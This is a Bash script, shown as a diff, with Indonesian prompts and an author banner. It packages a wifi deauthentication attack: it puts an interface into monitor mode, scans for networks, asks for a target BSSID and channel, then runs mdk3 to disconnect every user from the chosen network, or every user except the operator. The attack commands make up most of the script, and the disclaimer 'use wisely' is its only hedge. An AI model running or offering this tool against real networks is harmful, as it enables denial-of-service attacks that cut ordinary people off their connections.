@@ -1,0 +1,187 @@
+#!/bin/bash
+clear
+err="Ada Yang Salah Coeg Coba Lebih Teliti Lagi Bro Dan Liat Tutorial Nya Di File README.md."
+path=`pwd` # Path
+#colors
+blue='\e[0;34'
+cyan='\e[0;36m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+grey="\033[0;37m"
+purple="\033[0;35m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+mon="mon"
+white='\e[1;37m'
+nc="\e[0m"
+red='\e[1;31m'
+yellow='\e[1;33m'
+
+echo -e "$red"                     
+echo "                 ******************************************************"
+echo "                  %                      Author                         %"
+echo -e $white"                   %                                                     %"
+echo "                    %                  Dimas Setiawan                     %"
+echo "                     %              FB : Dimas Setiawan                    %"         
+echo "                     ******************************************************"
+
+#Check
+
+#bash
+if which bash >/dev/null; then
+                sleep 0.25
+    echo -e "$lightgreen [*] [BASH]$nc Terinstall [$nc✓$nc]"
+else
+                sleep 0.25
+        echo -e "$red [!] [BASH]$nc Tidak Terinstall [$red✗$nc]"
+                        sleep 1
+                echo "Cara install BASH [sudo apt-get install bash]"
+fi
+#airmon-ng
+if which airmon-ng >/dev/null; then
+                sleep 0.25
+    echo -e "$lightgreen [*] [AIRMONG-NG]$nc Terinstall [$nc✓$nc]"
+else
+                sleep 0.25
+        echo -e "$red [!] [AIRMONG-NG]$nc Tidak Terinstall [$red✗$nc]"
+                        sleep 1
+                echo "Cara Install Airmon-ng [sudo apt-get install airckrack-ng]"
+                sleep 0.25
+fi
+#airodump-ng
+if which airodump-ng >/dev/null; then
+                sleep 0.25
+    echo -e "$lightgreen [*] [AIRODUMP-NG]$nc Terinstall [$nc✓$nc]"
+else
+                sleep 0.25
+        echo -e "$red [!] [AIRODUMP-NG]$nc Tidak Terinstall [$red✗$nc]"
+                        sleep 1
+                echo "Cara install Airodump-ng [sudo apt-get install airckrack-ng]"
+fi
+#mdk3
+if which mdk3 >/dev/null; then
+                sleep 0.25
+    echo -e "$lightgreen [*] [MDK3]$nc Terinstall [$nc✓$nc]"
+                sleep 0.25
+else
+                sleep 0.25
+        echo -e "$red [!] [MDK3]$nc Tidak Terinstall [$red✗$nc]"
+                        sleep 1
+                echo "Cara install MDK3 [git clone https://github.com/wi-fi-analyzer/mdk3-master]."
+                exit 1
+fi
+#git
+if which git >/dev/null; then
+                sleep 0.25
+    echo -e "$lightgreen [*] [GIT]$nc Terinstall [$nc✓$nc]"
+                sleep 0.25
+else
+                sleep 0.25
+        echo -e "$red [!] [GIT]$nc Tidak Terinstall [$red✗$nc]"
+                        sleep 1
+                echo "Cara install Git [ sudo apt-get install git ]"
+                exit 1
+fi
+#		
+ clear    
+echo -e "$red"
+echo "               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+echo "               !               ~~~Gunakan Tools Ini Dengan Bijak~~~           !"
+echo "               !           Program Ini Hanya Recode Saja Jadi Maaf Jika       !"
+echo "               !            Ada Kesalahan Pada Program Ini Maklum Ini         !" 
+echo "               !                       Program Pertama Saya                   !"                                                                                                   
+echo "               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"       
+sleep 0.25
+echo ""
+echo -e $red" 01) Mematikan Semua User Yang Terhubung Dengan Wifi Yang Kamu Pilih"
+echo -e $white" 02) Mematikan Semua User Yang Terhubung Dengan Wifi Yang Kamu Pilih Kecuali Kamu"
+echo -e "$cyan"
+read -p "root@DIMAS:~ # " act;
+
+if [ $act = 01 ] || [ $act = 01 ]
+then
+clear
+       sleep 1
+echo ""
+echo -e $red" [+] Menambahkan Interface mon0 . . . "
+sleep 0.25  
+iw wlan0 interface add mon0 type monitor
+echo ""
+echo -e "$red  [!] CATATAN : $lightgreen Setalah Kamu Memilih Interface Monitor(Bukan PC/LaptopNya) Kamu Akan Mati ."
+sleep 0.5
+echo -e "$white [*] Ini Interface Yang Yang Tersedia  : $nc"
+echo ""
+sleep 0.25
+echo -e "$green +------------------+$nc" 
+echo -e "$lightgreen"
+ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
+echo -e "$nc"
+echo -e "$green +------------------+$nc"
+echo ""
+echo -e "$lightgreen"
+read -p "[*] Masukan Interface Kamu (Default : mon0) => " interface
+echo -e "$nc"
+airmon-ng start $interface
+airodump-ng $interface
+trap 2
+echo -e "$red"
+read -p "[*] Masukin BSSID Target => " bssid
+echo ""
+echo -e "$cyan"
+read -p "[*] Tempat Menyimpan BSSID (contoh : /root/[Path]/God.txt) => " path
+echo -e "$cyan"
+echo $bssid > $path
+echo -e "$lightgreen"
+read -p "[*] Masukin BSSID Channel nya => " ch
+echo -e "$red"
+echo "           +--^----------,--------,-----,------------------^-, "
+echo -e "           | $red |||||||||      |       Menyerang Jaringan      O "
+echo -e $cyan"           +---------------------------^---------------------| "
+echo -e $cyan"            \_,---------,---------,-------------------------' "
+echo -e "              / $red"XXXXXX"$cyan /'|       /'  Name = Dimas Setiawan  "
+echo -e "             / $red"XXXXXX"$cyan /   \    /'  Author = Dimas Setiawan"
+echo -e "            / $red"XXXXXX"$cyan / _______/  Fb = Dimas Setiawan  "
+echo -e "           / $red"XXXXXX"$cyan /   "
+echo -e "           / $red"XXXXXX"$cyan / "
+echo "           (________( "
+echo -e "            ------'        $red   "
+echo -e "$cyan"
+mdk3 $interface d -b $path -c $ch
+echo -e "$nc"
+fi
+
+if [ -d $path ]; then
+        echo "Directory $path Tersedia.[✔]"
+else
+        echo -e "$red Keluar Dari Program$nc , Sepertinnya Ada Yang Salah"
+        echo "$err [✘]"
+        exit 1
+fi
+
+if [ $act = 02 ] || [ $act = 02 ]
+then
+clear
+echo -e $cyan" [*] Menjalankan Airmon-ng . . . "
+sleep 1
+airmon-ng
+echo -e $red" [+] Menambahkan Interface mon0 . . . "
+sleep 0.25  
+iw wlan0 interface add mon0 type monitor
+sleep 0.25
+ifconfig wlan0 
+echo -e "$lightgreen"
+read -p "[*] Masukin BSSID Kamu (Contoh : ether 74:e5:XX:XX:XX:XX #masukin BBSID Nya Aja) => " bssid
+echo ""
+echo -e "$cyan"
+read -p "[*] Tempat Menyimpan BSSID (contoh : /root/[Path]/God.txt) => " path
+echo -e "$lightgreen"
+echo $bssid > $path
+sleep 1
+echo "                            ---------------------------------------------- "
+echo "                            |                  SERANG !!!                | "
+echo "                            ---------------------------------------------- "
+mdk3 mon0 d -w $path
+fi
